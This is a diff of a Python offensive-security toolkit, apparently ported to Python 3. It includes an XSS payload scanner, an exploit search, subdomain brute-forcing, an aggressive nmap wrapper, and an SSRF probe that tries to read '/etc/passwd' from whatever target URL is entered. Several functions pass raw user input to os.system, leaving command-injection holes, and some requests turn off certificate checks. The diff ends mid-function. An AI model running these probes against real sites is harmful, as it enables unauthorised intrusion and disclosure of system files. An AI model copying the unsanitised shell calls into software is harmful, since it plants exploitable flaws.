@@ -5,52 +5,223 @@
 
 from __future__ import print_function
 
-import httplib
 import os
 import random
 import re
-import socket
-import ssl
 import sys
 import time
-import urllib
-import urlparse
+import traceback
 from datetime import datetime
 from string import whitespace
 from threading import Thread
 
 import dns.resolver
-from colorama import *
+import requests
+from colorama import Fore, Style
+
+try:
+    import urlparse
+except ImportError:
+    import urllib.parse as urlparse
+try:
+    import queue
+except ImportError:
+    import Queue as queue
+
+try:
+    input = raw_input
+except NameError:
+    pass
+
+try:
+    import readline
+    readline.parse_and_bind("tab: complete")
+except ImportError:
+    pass
+
+# CONSTANTS
+GOOD = "[+] "
+INFO = "[!] "
+NEWLINE = "\n"
+NOT_VULNERABLE = "Not Vulnerable"
 
 
-def again():
-    inp = raw_input("\n[e]xit or launch [a]gain? (e/a)").lower()
-    if inp == 'a':
-        repeat()
-    elif inp == 'e':
-        print("\nQuitting...")
-    else:
-        print("[!] Incorrect option selected")
-        again()
-def li():
+def line():
     print("====================================")
+
+
+def xss():
+    def list_import(file):
+        try:
+            # Importing Payloads from specified wordlist.
+            with open(file, 'r') as list_file:
+                content = list_file.readlines()
+            return [x.strip() for x in content]
+        except IOError:
+            print(Style.BRIGHT + Fore.RED + INFO +
+                  "List not found!" + Style.RESET_ALL)
+            return list()
+
+    def params_check(params, statuses):
+        try:
+            dashes1 = str()
+            dashes2 = str()
+            lostatus = str()
+            nums = []
+            num_of_params = len(max(params, key=len))
+            if num_of_params < 10:
+                num_of_params = 10
+            for index in range(len(params)):
+                nums.append(index)
+            maxval = str(len(nums))  # number
+            for _ in range(num_of_params):
+                dashes2 += "-"
+            for _ in range(len(maxval)):
+                dashes1 += "-"
+            statuslen = len(max(statuses, key=len))
+            for _ in range(statuslen):
+                lostatus += "-"
+            if len(dashes2) < 10:
+                dashes2 = "----------"
+            if len(lostatus) < 14:
+                lostatus = "--------------"
+            if len(dashes1) < 2:
+                dashes1 = "-"
+            los = statuslen
+            if los < 14:
+                los = 14
+            upb = ("+-%s-+-%s-+-%s-+") % (dashes1, dashes2, lostatus)
+            print(upb)
+            print("| # | " + "Param".center(num_of_params, " ") +
+                  " | " + "Status".center(los, " ") + " |")
+            print(upb)
+            for num, param, status in zip(nums, params, statuses):
+                # string = (" %s | %s ") % (str(num), str(param))
+                lofnum = str(num).center(int(len(dashes1)), " ")
+                lofstr = param.center(num_of_params, " ")
+                lofst = status.center(los, " ")
+                if NOT_VULNERABLE in lofst:
+                    lofst = Fore.GREEN + \
+                        status.center(los, " ") + Style.RESET_ALL
+                else:
+                    lofst = Fore.RED + \
+                        status.center(los, " ") + Style.RESET_ALL
+                print("| " + lofnum + " | " + lofstr + " | " + lofst + " |")
+                print(upb)
+            return str()
+        except ValueError:
+            print(Style.BRIGHT + Fore.RED +
+                  "No parameters in URL!" + Style.RESET_ALL)
+
+    def complete(params, results, vulnerable, domain):
+        if vulnerable == 0:
+            print(
+                GOOD + "All parameters are " + Style.BRIGHT + Fore.GREEN + NOT_VULNERABLE + Style.RESET_ALL + " to XSS.")
+        elif vulnerable == 1:
+            print((GOOD + "%s Parameter is " + Style.BRIGHT + Fore.RED +
+                   "vulnerable" + Style.RESET_ALL + " to XSS.") % vulnerable)
+        else:
+            print((GOOD + "%s parameters are " + Style.BRIGHT + Fore.RED +
+                   "vulnerable" + Style.RESET_ALL + " to XSS.") % vulnerable)
+        print((GOOD + "Scan Result for %s:") % domain)
+        print(params_check(params, results))
+
+    def get():
+        try:
+            site = input(
+                "Enter URL (e.g https://example.com/?id=): ")  # Taking URL
+            if not site.startswith('https://') or site.startswith('http://'):
+                site = "http://" + site
+            finalurl = urlparse.urlparse(site)
+            domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
+            domain = domain0.replace(
+                "https://", "").replace("http://", "").replace("www.", "").replace("/", "")
+            print(Style.DIM + Fore.WHITE +
+                  GOOD + "Checking if " + domain + " is available..." + Style.RESET_ALL)
+            response = requests.get(domain0).text
+            if not response:
+                print(Style.BRIGHT + Fore.RED +
+                      INFO + "Site " + domain + " is offline!" + Style.RESET_ALL)
+                return
+            print(GOOD + Fore.GREEN + domain +
+                  " is available!!" + Style.RESET_ALL)
+
+            wordlist = input(
+                "Enter XSS wordlist [Defaults to ./src/wordlist.txt]: ")
+            if not wordlist:
+                wordlist = './src/wordlist.txt'
+                # deafult-word-list-for-xss
+            payloads = list_import(wordlist)
+            lop = str(len(payloads))
+            print(GOOD + lop + " Payloads loaded..")
+            parameters = urlparse.parse_qs(
+                urlparse.urlparse(site).query, keep_blank_values=True)
+            path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
+                site).path
+
+            final_params = list()
+            final_results = list()
+            progress = 0
+            total = 0
+            # Scanning the parameter.
+            for param_name in parameters.keys():
+                vulnerable = False
+                print(GOOD + "Now checking '" + param_name + "' param")
+                final_params.append(str(param_name))
+                for payload in payloads:  #
+                    validate = payload.translate(whitespace)
+                    if validate == "":
+                        progress += 1
+                    else:
+                        sys.stdout.write(
+                            "\r%s %i / %s payloads tested." % (GOOD, progress + 1, len(payloads)))
+                        sys.stdout.flush()
+                        progress += 1
+                        enc = requests.utils.requote_uri(payload)
+                        data = path + "?" + param_name + \
+                            "=" + parameters[param_name][0] + enc
+                        page = requests.get(data).text
+                        if payload in page:
+                            print((Style.BRIGHT + Fore.RED + NEWLINE + INFO + "XSS Vulnerability Found! " + NEWLINE + Fore.RED + Style.BRIGHT + INFO +
+                                   "Parameter:\t%s" + NEWLINE + Fore.RED + Style.BRIGHT + INFO + "Payload:\t%s" + Style.RESET_ALL) % (param_name, payload))
+                            final_results.append("  Vulnerable  ")
+                            vulnerable = True
+                            total += 1
+                            progress += 1
+                            break
+                        else:
+                            vulnerable = False
+                if not vulnerable:
+                    print((NEWLINE + GOOD + "'%s' parameter not vulnerable.") %
+                          param_name)
+                    final_results.append(NOT_VULNERABLE)
+                    progress += 1
+                progress = 0
+            complete(final_params, final_results, total, domain)
+        except KeyboardInterrupt:
+            print(NEWLINE + "Exit...")
+
+    get()
+
+
+def exploits():
+    line()
+    print("EXPLITS")
+    choice = int(input("[1] Seach Exploits\n[2] Update Pack\n\nChoice: "))
+    if choice == 1:
+        query = input("Search exploit (e.g wordpress): ")
+        print(NEWLINE + 'Searching exploits...' + NEWLINE)
+        os.system('getsploit ' + query)
+    elif choice == 2:
+        os.system('getsploit --update')
+
+
 def subd():
     version = "1"
     build = "0.1"
-    try:
-        import urllib.request as urllib2
-    except ImportError:
-        import urllib2
-    # support for python 2.7 and 3
-    try:
-        import queue
-    except:
-        import Queue as queue
-    # exit handler for signals.  So ctrl+c will work,  even with py threads.
-    def killme(signum=0, frame=0):
-        os.kill(os.getpid(), 9)
-    class lookup(Thread):
-        def __init__(self, in_q, out_q, domain, wildcard=False, resolver_list=[]):
+
+    class Lookup(Thread):
+        def __init__(self, in_q, out_q, domain, wildcard=False, resolver_list=list()):
             Thread.__init__(self)
             self.in_q = in_q
             self.out_q = out_q
@@ -58,13 +229,14 @@ def subd():
             self.wildcard = wildcard
             self.resolver_list = resolver_list
             self.resolver = dns.resolver.Resolver()
-            if len(self.resolver.nameservers):
+            if self.resolver.nameservers:
                 self.backup_resolver = self.resolver.nameservers
             else:
                 # we must have a resolver,  and this is the default resolver on my system...
                 self.backup_resolver = ['127.0.0.1']
-            if len(self.resolver_list):
+            if self.resolver_list:
                 self.resolver.nameservers = self.resolver_list
+
         def check(self, host):
             slept = 0
             while True:
@@ -72,45 +244,39 @@ def subd():
                     answer = self.resolver.query(host)
                     if answer:
                         return str(answer[0])
-                    else:
-                        return False
-                except Exception as e:
-                    if type(e) == dns.resolver.NXDOMAIN:
-                        # not found
-                        return False
-                    elif type(e) == dns.resolver.NoAnswer or type(e) == dns.resolver.Timeout:
-                        if slept == 4:
-                            # This dns server stopped responding.
-                            # We could be hitting a rate limit.
-                            if self.resolver.nameservers == self.backup_resolver:
-                                # if we are already using the backup_resolver use the resolver_list
-                                self.resolver.nameservers = self.resolver_list
-                            else:
-                                # fall back on the system's dns name server
-                                self.resolver.nameservers = self.backup_resolver
-                        elif slept > 5:
-                            # hmm the backup resolver didn't work,
-                            # so lets go back to the resolver_list provided.
-                            # If the self.backup_resolver list did work, lets stick with it.
+                    return
+                except dns.resolver.NXDOMAIN:
+                    return
+                except (dns.resolver.NoAnswer, dns.resolver.Timeout):
+                    if slept == 4:
+                        # This dns server stopped responding.
+                        # We could be hitting a rate limit.
+                        if self.resolver.nameservers == self.backup_resolver:
+                            # if we are already using the backup_resolver use the resolver_list
                             self.resolver.nameservers = self.resolver_list
-                            # I don't think we are ever guaranteed a response for a given name.
-                            return False
-                        # Hmm,  we might have hit a rate limit on a resolver.
-                        time.sleep(1)
-                        slept += 1
-                        # retry...
-                    elif type(e) == IndexError:
-                        # Some old versions of dnspython throw this error,
-                        # doesn't seem to affect the results,  and it was fixed in later versions.
-                        pass
-                    else:
-                        # dnspython threw some strange exception...
-                        raise e
+                        else:
+                            # fall back on the system's dns name server
+                            self.resolver.nameservers = self.backup_resolver
+                    elif slept > 5:
+                        # hmm the backup resolver didn't work,
+                        # so lets go back to the resolver_list provided.
+                        # If the self.backup_resolver list did work, lets stick with it.
+                        self.resolver.nameservers = self.resolver_list
+                        # I don't think we are ever guaranteed a response for a given name.
+                        return
+                    # Hmm,  we might have hit a rate limit on a resolver.
+                    time.sleep(1)
+                    slept += 1
+                except IndexError:
+                    pass
+                except Exception as error:
+                    raise error
+
         def run(self):
             while True:
                 sub = self.in_q.get()
-                #if sub != False:
-                    #print 'Try: %s' % (sub)
+                # if sub != False:
+                # print 'Try: %s' % (sub)
                 if not sub:
                     # Perpetuate the terminator for all threads to see
                     self.in_q.put(False)
@@ -124,53 +290,22 @@ def subd():
                         if addr and addr != self.wildcard:
                             test = (test, str(addr))
                             self.out_q.put(test)
-                    except Exception as ex:
-                        # do nothing
-                        nothing = True
+                    except Exception:
+                        pass
     # ++ FUNCTIONS //#
     # func Writelog
+
     def func_writelog(how, logloc, txt):  # how: a=append, w=new write
         with open(logloc, how) as mylog:
             mylog.write(txt)
-    # Return a list of unique sub domains,  alfab. sorted .
-    def extract_subdomains(file_name):
-        subs = {}
-        sub_file = open(file_name).read()
-        # Only match domains that have 3 or more sections subdomain.domain.tld
-        domain_match = re.compile("([a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*)+")
-        f_all = re.findall(domain_match, sub_file)
-        del sub_file
-        for i in f_all:
-            if i.find(".") >= 0:
-                p = i.split(".")[0:-1]
-                # gobble everything that might be a TLD
-                while p and len(p[-1]) <= 3:
-                    p = p[0:-1]
-                # remove the domain name
-                p = p[0:-1]
-                # do we have a subdomain.domain left?
-                if len(p) >= 1:
-                    # print(str(p) + " : " + i)
-                    for q in p:
-                        if q:
-                            # domain names can only be lower case.
-                            q = q.lower()
-                            if q in subs:
-                                subs[q] += 1
-                            else:
-                                subs[q] = 1
-        # Free some memory before the sort...
-        del f_all
-        # Sort by freq in desc order
-        subs_sorted = sorted(subs.keys(), key=lambda x: subs[x], reverse=True)
-        return subs_sorted
+
     def check_resolvers(file_name):
         txt = 'Checking sudomains...'
         print(txt)
         ret = []
         resolver = dns.resolver.Resolver()
         res_file = open(file_name).read()
-        for server in res_file.split("\n"):
+        for server in res_file.split(NEWLINE):
             server = server.strip()
             if server:
                 resolver.nameservers = [server]
@@ -178,9 +313,10 @@ def subd():
                     resolver.query("www.google.com")
                     # should throw an exception before this line.
                     ret.append(server)
-                except:
+                except Exception:
                     pass
         return ret
+
     def run_target(target, hosts, resolve_list, thread_count, print_numeric):
         # The target might have a wildcard dns record...
         wildcard = False
@@ -188,12 +324,12 @@ def subd():
             resp = dns.resolver.Resolver().query(
                 "would never be a domain name" + str(random.randint(1, 9999)) + "." + target)
             wildcard = str(resp[0])
-        except:
+        except Exception:
             pass
         in_q = queue.Queue()
         out_q = queue.Queue()
-        for h in hosts:
-            in_q.put(h)
+        for host in hosts:
+            in_q.put(host)
         # Terminate the queue
         in_q.put(False)
         step_size = int(len(resolve_list) / thread_count)
@@ -202,7 +338,8 @@ def subd():
             step_size = 1
         step = 0
         for i in range(thread_count):
-            threads.append(lookup(in_q, out_q, target, wildcard, resolve_list[step:step + step_size]))
+            threads.append(Lookup(in_q, out_q, target, wildcard,
+                                  resolve_list[step:step + step_size]))
             threads[-1].start()
         step += step_size
         if step >= len(resolve_list):
@@ -213,24 +350,24 @@ def subd():
         i = 0
         while True:
             try:
-                d = out_q.get(True, 10)
+                domain = out_q.get(True, 10)
                 # we will get an empty exception before this runs.
-                if not d:
+                if not domain:
                     threads_remaining -= 1
                 else:
                     if not print_numeric:
-                        txt = "%s" % (d[0])
-                        func_writelog('a', logloc, txt + '\n')
-                        #print txt
+                        txt = "%s" % (domain[0])
+                        func_writelog('a', logloc, txt + NEWLINE)
+                        # print txt
                     else:
-                        txt = "%s -> %s" % (d[0], d[1])
-                        func_writelog('a', logloc, txt + '\n')
+                        txt = "%s -> %s" % (domain[0], domain[1])
+                        func_writelog('a', logloc, txt + NEWLINE)
                         # print(txt)
                         subdlist[i] = txt
-                        if d[1] in subiplist.keys():
-                            subiplist[d[1]].append(d[0])
+                        if domain[1] in subiplist.keys():
+                            subiplist[domain[1]].append(domain[0])
                         else:
-                            subiplist[d[1]] = [d[0]]
+                            subiplist[domain[1]] = [domain[0]]
                         i += 1
             except queue.Empty:
                 pass
@@ -240,26 +377,28 @@ def subd():
                 print("Done. ")
                 txt = 'Subdomains found : %s' % (len(subdlist))
                 # Alfab. ordered result list
-                func_writelog('a', logloc, '\n' + txt + '\nOrdered list:\n-------------\n')
+                func_writelog('a', logloc, NEWLINE + txt + NEWLINE +
+                              'Ordered list:' + NEWLINE + '-------------' + NEWLINE)
                 print(txt)
                 print(' ')
                 print('Ordered List:')
                 for result in sorted(subdlist.values()):
                     txt = result
-                    func_writelog('a', logloc, str(txt) + '\n')
+                    func_writelog('a', logloc, str(txt) + NEWLINE)
                     print(txt)
                 print(' ')
                 # IP-ordered result list
                 txt = "IP-ordered List:"
-                func_writelog('a', logloc, '\n' + txt + '\n----------------\n')
+                func_writelog('a', logloc, NEWLINE + txt +
+                              NEWLINE + '----------------' + NEWLINE)
                 print(txt)
                 for ips in subiplist:
                     txt = ips
-                    func_writelog('a', logloc, str(txt) + '\n')
+                    func_writelog('a', logloc, str(txt) + NEWLINE)
                     print(txt)
                     for ipssub in subiplist[ips]:
                         txt = "      |=> %s" % (ipssub)
-                        func_writelog('a', logloc, str(txt) + '\n')
+                        func_writelog('a', logloc, str(txt) + NEWLINE)
                         print(txt)
 
                 end = datetime.now()
@@ -268,12 +407,12 @@ def subd():
                 time_end = str(end.year) + "-" + str(end.month) + "-" + str(end.day) + "    " + str(
                     end.hour) + ":" + str(end.minute) + ":" + str(end.second)
                 txt = "Scan Ended : %s" % (time_end)
-                txtB = "Duration : %ss" % (duration)
-                func_writelog('a', logloc, '\n' + txt + '\n')
-                func_writelog('a', logloc, txtB + '\n')
+                txt_b = "Duration : %ss" % (duration)
+                func_writelog('a', logloc, NEWLINE + txt + NEWLINE)
+                func_writelog('a', logloc, txt_b + NEWLINE)
                 print(" ")
                 print(txt)
-                print(txtB)
+                print(txt_b)
                 break
     """
     ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
@@ -289,445 +428,360 @@ def subd():
     :END
     ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
     """
-    if __name__ == "__main__":
-        # Target
-        print("\n")
-        target = raw_input("Target domain (eg. example.com) : ")
-        # Subs
-        subfiles = "", "subs/subs_xs.txt"
-        choosensub = 1
-        hosts = open(subfiles[int(choosensub)]).read().split("\n")
-        # Action
-        resolve_list = check_resolvers("cnf/resolvers.txt")
-        threads = []
-        # signal.signal(signal.SIGINT, killme)
-        target = target.strip()
-        if target:
-            """ Every run : create log file """
-            # -- Creating log file in directory 'log' --#
-            now = datetime.now()
-            time_stamp_start = int(time.time())
-            time_start = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "    " + str(now.hour) + ":" + str(
-                now.minute) + ":" + str(now.second)
-            logfile = target.replace('.', '_') + '_' + str(now.year) + str(now.month) + str(now.day) + str(
-                now.hour) + str(now.minute) + str(now.second) + ".log"
-            print("Creating log : log/%s" % (logfile), end=' ')
-            logloc = logdir + "/" + logfile
-            with open(logloc, "w") as mylog:
-                os.chmod(logloc, 0o660)
-                mylog.write("Log created  - " + version + " build " + build + "\n\n")
-                print(".... Done")
-                print(" ")
-            """ """
-            txt = "Scan Started : %s" % (time_start)
-            func_writelog('a', logloc, txt + '\n\n')
-            print(txt)
+    # Target
+    print(NEWLINE)
+    target = input("Target domain (eg. example.com): ")
+    # Subs
+    subfiles = "", "./src/subs/subs_xs.txt"
+    choosensub = 1
+    hosts = open(subfiles[int(choosensub)]).read().split(NEWLINE)
+    # Action
+    resolve_list = check_resolvers("cnf/resolvers.txt")
+    threads = []
+    # signal.signal(signal.SIGINT, killme)
+    target = target.strip()
+    if target:
+        """ Every run : create log file """
+        # -- Creating log file in directory 'log' --#
+        now = datetime.now()
+        time_stamp_start = int(time.time())
+        time_start = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "    " + str(now.hour) + ":" + str(
+            now.minute) + ":" + str(now.second)
+        logfile = target.replace('.', '_') + '_' + str(now.year) + str(now.month) + str(now.day) + str(
+            now.hour) + str(now.minute) + str(now.second) + ".log"
+        print("Creating log : log/%s" % (logfile), end=' ')
+        logloc = logdir + "/" + logfile
+        with open(logloc, "w") as mylog:
+            os.chmod(logloc, 0o660)
+            mylog.write("Log created  - " + version +
+                        " build " + build + NEWLINE + NEWLINE)
+            print(".... Done")
             print(" ")
-            # -- Visible IP --#
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            try:
-                visible_ip = urllib2.urlopen('https://cleveridge.org/_exchange/open_files/return_ip.php?s=subd_scanner',
-                                             context=ctx).read()
-            except Exception:
-                visible_ip = urllib2.urlopen('https://enabledns.com/ip', context=ctx).read()
-            txt = "Visible IP : " + visible_ip
-            func_writelog("a", logloc, txt + "\n\n")
-            print(txt)
-            print(' ')
+        """ """
+        txt = "Scan Started : %s" % (time_start)
+        func_writelog('a', logloc, txt + NEWLINE + NEWLINE)
+        print(txt)
+        print(" ")
+        # -- Visible IP --#
+        try:
+            visible_ip = requests.get(
+                'https://cleveridge.org/_exchange/open_files/return_ip.php?s=subd_scanner', verify=False).text
+        except Exception:
+            visible_ip = requests.get(
+                'https://enabledns.com/ip', verify=False).text
+        txt = "Visible IP: " + visible_ip
+        func_writelog("a", logloc, txt + NEWLINE + NEWLINE)
+        print(txt)
+        print(' ')
 
-            txt = "Subdomains in %s : " % (target)
-            func_writelog('a', logloc, txt + '\n')
-            print(txt)
-            run_target(target, hosts, resolve_list, 10, True)
-            repeat()
-def xss():
-    grey = Style.DIM + Fore.WHITE
+        txt = "Subdomains in %s: " % (target)
+        func_writelog('a', logloc, txt + NEWLINE)
+        print(txt)
+        run_target(target, hosts, resolve_list, 10, True)
+        menu()
 
-    def wordlistimport(file, lst):
+
+def whois_geo():
+    who = input('Domain(e.g google.com): ')
+    whois = requests.get(
+        'http://api.hackertarget.com/whois/?q=' + who).text
+    print(whois)
+    line()
+    print("GEOIP LOCATION")
+    line()
+    geoip = requests.get(
+        'http://api.hackertarget.com/geoip/?q=' + who).text
+    print(geoip)
+    line()
+
+
+def ssrf_injection():
+    print(NEWLINE)
+    ssrf = input(
+        'Target URL (e.g http://robert-brook.com/parliament/index.php?page=): ')
+    print("\tGETTING /etc/passwd from system")
+    ssrf_result = requests.get(ssrf + 'file:///etc/passwd')
+    if ssrf_result.status_code == 200:
+        print(ssrf_result.text)
+    else:
+        print("SSRF failed on %s" % ssrf_result.url)
+    print(
+        NEWLINE + " For detail visit https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF")
+
+
+def nmap_auto_banner():
+    target = input('Target Domain/IP (e.g www.google.com): ')
+    line()
+    print("\tRUNNING SYSTEM NMAP")
+    line()
+    os.system('nmap -sT -sV -sC -PN -A -T5 ' + target)
+    line()
+    print("\tTCP PORT SCANING")
+    line()
+    tcp = requests.get(
+        'http://api.hackertarget.com/nmap/?q=' + target).text
+    print(tcp)
+    line()
+    print("\tSUBNET CALCULATION")
+    line()
+    subnet = requests.get(
+        'https://api.hackertarget.com/subnetcalc/?q=' + target).text
+    print(subnet)
+    print(NEWLINE)
+
+
+def js_url_parser():
+    def extract_urls(content):
+        urls = re.findall(
+            'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', content.lower())
+        clean_urls = []
+        for url in urls:
+            last_char = url[-1]
+            if bool(re.match(r'[^a-zA-Z0-9/]', last_char)):
+                clean_urls.append(url[:-1])
+            else:
+                clean_urls.append(url)
+        return clean_urls
+
+    file_name = input('File name (e.g tests/test.js):')
+    print(NEWLINE + "Extracting Url from %s..." % file_name)
+    line()
+    urls = extract_urls(open(file_name, 'r').read())
+    for url in urls:
+        print(url)
+    line()
+
+
+def target_domain():
+    HEADERS = {"X-XSS-Protection": ['1; mode=block'],
+               "X-Content-Type-Options": ['nosniff'],
+               "X-Frame-Options": ['DENY', 'SAMEORIGIN'],
+               "Cache-Control": ['no-store, no-cache', 'no-cache, no-store'],
+               "Content-Security-Policy": [None],
+               "WebKit-X-CSP": [None],
+               "X-Content-Security-Policy": [None],
+               "Strict-Transport-Security": [None],
+               "Access-Control-Allow-Origin": [None],
+               "Origin": []}
+
+    domain = input('Target Domain(e.g google.com): ')
+
+    def passed(bar):
+        print("PASS = " + bar)
+
+    def failed(bar):
+        print("FAIL = " + bar)
+
+    def info(host):
+        print("-----------------------------------")
+        print("Target - " + host)
+        print("-----------------------------------")
+
+    def format_url(url):
+        if not url.startswith("http://") or not url.startswith("https://"):
+            return "http://" + url
+        return url
+
+    url = format_url(domain)
+    response = requests.get(url)
+    info(url)
+    for header in HEADERS.keys():
         try:
-            with open(file, 'r') as f:  # Importing Payloads from specified wordlist.
-                #print(Style.DIM + Fore.WHITE + "[+] Loading Payloads from default wordlist." + Style.RESET_ALL)
-                for line in f:
-                    final = str(line.replace("\n", ""))
-                    lst.append(final)
-        except IOError:
-            print(Style.BRIGHT + Fore.RED + "[!] List not found!" + Style.RESET_ALL)
-            again()
-    def bg(p, status):
-        try:
-            b = ""
-            l = ""
-            lostatus = ""
-            num = []
-            s = len(max(p, key=len))  # list
-            if s < 10:
-                s = 10
-            for i in range(len(p)): num.append(i)
-            maxval = str(len(num))  # number
-            for i in range(s): b = b + "-"
-            for i in range(len(maxval)): l = l + "-"
-            statuslen = len(max(status, key=len))
-            for i in range(statuslen): lostatus = lostatus + "-"
-            if len(b) < 10:
-                b = "----------"
-            if len(lostatus) < 14:
-                lostatus = "--------------"
-            if len(l) < 2:
-                l = "--"
-            los = statuslen
-            if los < 14:
-                los = 14
-            lenb = len(str(len(b)))
-            if lenb < 14:
-                lenb = 10
+            headval = response.headers[header]
+            if headval in HEADERS[header]:
+                if HEADERS[header] == "Origin":
+                    if headval != None:
+                        failed(header + ': ' + str(headval))
+                    else:
+                        passed(header + ': ' + str(headval))
+                passed(header + ': ' + str(headval))
             else:
-                lenb = 20
-            upb = ("+-%s-+-%s-+-%s-+") % (l, b, lostatus)
-            print(upb)
-            st0 = "Param"
-            st1 = "Status"
-            print("| + | " + st0.center(s, " ") + " | " + st1.center(los, " ") + " |")
-            print(upb)
-            for n, i, d in zip(num, p, status):
-                string = (" %s | %s ") % (str(n), str(i))
-                lofnum = str(n).center(int(len(l)), " ")
-                lofstr = i.center(s, " ")
-                lofst = d.center(los, " ")
-                if "Not Vulnerable" in lofst:
-                    lofst = Fore.GREEN + d.center(los, " ") + Style.RESET_ALL
-                else:
-                    lofst = Fore.RED + d.center(los, " ") + Style.RESET_ALL
-                print("| " + lofnum + " | " + lofstr + " | " + lofst + " |")
-                print(upb)
-            return ("")
-        except(ValueError):
-            print(Style.BRIGHT + Fore.RED + "No parameters in URL!" + Style.RESET_ALL)
-            again()
-    def complete(p, r, c, d):
-        if c == 0:
-            print(
-                        "[+] parameters are " + Style.BRIGHT + Fore.GREEN + "not vulnerable" + Style.RESET_ALL + " to XSS.")
-        elif c == 1:
-            print(("[+] %s Parameter is " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c)
-        else:
-            print(("[+] %s Parameters are " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c)
-        print(("[+] Scan Result for %s:") % d)
-        print(bg(p, r))
-        again()
-    def GET():
-        try:
-            try:
-                grey = Style.DIM + Fore.WHITE
-                site = raw_input("Enter URL (e.g https://example.com/?id=) : ")  # Taking URL
-                if 'https://' in site:
-                    pass
-                elif 'http://' in site:
-                    pass
-                else:
-                    site = "http://" + site
-                finalurl = urlparse.urlparse(site)
-                urldata = urlparse.parse_qsl(finalurl.query)
-                domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
-                domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
-                print (Style.DIM + Fore.WHITE + "[+] Checking if " + domain + " is available..." + Style.RESET_ALL)
-                connection = httplib.HTTPConnection(domain)
-                connection.connect()
-                print("[+] " + Fore.GREEN + domain + " is available!!" + Style.RESET_ALL)
-                url = site
-                paraname = []
-                paravalue = []
-                wordlist = raw_input("Press return to continue...")
-                if len(wordlist) == 0:
-                    wordlist = 'wordlist.txt'
-                    #deafult-word-list-for-xss
-                else:
-                    pass
-                payloads = []
-                wordlistimport(wordlist, payloads)
-                lop = str(len(payloads))
-                grey = Style.DIM + Fore.WHITE
-                print("[+] " + lop + " Payloads loaded..")
-                o = urlparse.urlparse(site)
-                parameters = urlparse.parse_qs(o.query, keep_blank_values=True)
-                path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
-                    site).path
-                for para in parameters:  # Arranging parameters and values.
-                    for i in parameters[para]:
-                        paraname.append(para)
-                        paravalue.append(i)
-                total = 0
-                c = 0
-                fpar = []
-                fresult = []
-                progress = 0
-                for pn, pv in zip(paraname, paravalue):  # Scanning the parameter.
-                    print("[+] Now checking '" + pn + "' param")
-                    fpar.append(str(pn))
-                    for x in payloads:  #
-                        validate = x.translate(None, whitespace)
-                        if validate == "":
-                            progress = progress + 1
-                        else:
-                            sys.stdout.write("\r[+] %i / %s payloads tested." % (progress, len(payloads)))
-                            sys.stdout.flush()
-                            progress = progress + 1
-                            enc = urllib.quote_plus(x)
-                            data = path + "?" + pn + "=" + pv + enc
-                            page = urllib.urlopen(data)
-                            sourcecode = page.read()
-                            if x in sourcecode:
-                                print((
-                                                 Style.BRIGHT + Fore.RED + "\n[!]" + " XSS Vulnerability Found! \n" + Fore.RED + Style.BRIGHT + "[!]" + " Parameter:\t%s\n" + Fore.RED + Style.BRIGHT + "[!]" + " Payload:\t%s" + Style.RESET_ALL) % (
-                                     pn, x))
-                                fresult.append("  Vulnerable  ")
-                                c = 1
-                                total = total + 1
-                                progress = progress + 1
-                                break
-                            else:
-                                c = 0
-                    if c == 0:
-                        print(( "\n[+] '%s' parameter not vulnerable." ) % pn)
-                        fresult.append("Not Vulnerable")
-                        progress = progress + 1
-                        pass
-                    progress = 0
-                complete(fpar, fresult, total, domain)
-            except(httplib.HTTPResponse, socket.error) as Exit:
-                print(Style.BRIGHT + Fore.RED + "[!] Site " + domain + " is offline!" + Style.RESET_ALL)
-                again()
-        except(KeyboardInterrupt) as Exit:
-            print("\nExit...")
-    try:
-        GET()
-        #again()
-    except(KeyboardInterrupt) as Exit:
-        print("\nExit...")
-cwd = os.getcwd()
-def ban():
-    with open('exp/ban.md', 'r') as myfile:
-        print(myfile.read())
-def repeat():
-    ban()
-    try:
-        choice = int(input("\n\nchoice : "))
-        if choice == 1:
-            xss()
-        elif choice == 2:
-            ins = int(input("[1] Exploit\n[2] Update Pack\n\nChoice: "))
-            if ins == 1:
-                inp = raw_input("Search exploit (e.g wordpress) : ")
-                print('\nSearching exploits...\n')
-                time.sleep(5)
-                os.system('cd exp;chmod 777 gs.py;./gs.py ' + inp)
-                repeat()
-            elif choice == 2:
-                os.system('cd exp;chmod 777 gs.py;./gs.py --update')
-                repeat()
-        elif choice == 3:
-            subd()
-        elif choice == 4:
-            who = raw_input('Domain(e.g google.com): ')
-            whois = os.system('curl http://api.hackertarget.com/whois/?q='+who)
-            whois1=os.system('whois '+who)
-            print(whois)
-            li()
-            print("GEOIP LOCATION")
-            li()
-            os.system('curl http://api.hackertarget.com/geoip/?q='+who)
-            print("\n")
-            li()
-            repeat()
-        elif choice == 5:
-            ssrf = raw_input('URL(e.g http://robert-brook.com/parliament/index.php?page=): ')
-            ssrf_result=os.system('curl %sfile:///etc/passwd ' % (ssrf))
-            print(ssrf_result)
-            print("\n For detail visit https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF")
-            time.sleep(5)
-            again()
-        elif choice == 6:
-            nmp = raw_input('Target Domain/IP (e.g www.google.com): ')
-            li()
-            print("\tRunning system nmap")
-            li()
-            os.system('nmap -sT -sV -sC -PN -A -T5 '+nmp)
-            li()
-            print("\tTCP PORT SCANING")
-            li()
-            os.system('curl http://api.hackertarget.com/nmap/?q='+nmp)
-            li()
-            print("\tSUBNET CALCULATION")
-            li()
-            os.system('curl https://api.hackertarget.com/subnetcalc/?q='+nmp)
-            print("\n")
-            again()
-        elif choice == 7:
-            ins = int(input("[1] Run program\n[2] Install Pack\n\nChoice: "))
-            if ins == 1:
